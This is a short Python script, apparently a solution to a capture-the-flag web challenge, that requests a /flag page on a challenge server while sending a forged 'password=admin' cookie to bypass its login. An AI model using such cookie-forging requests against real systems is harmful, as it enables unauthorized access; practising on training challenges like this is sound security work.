
import requests

host='http://web-05.challs.olicyber.it/flag'
cookies={'password':'admin'}
x = requests.get(host, cookies=cookies)

print(x.text)
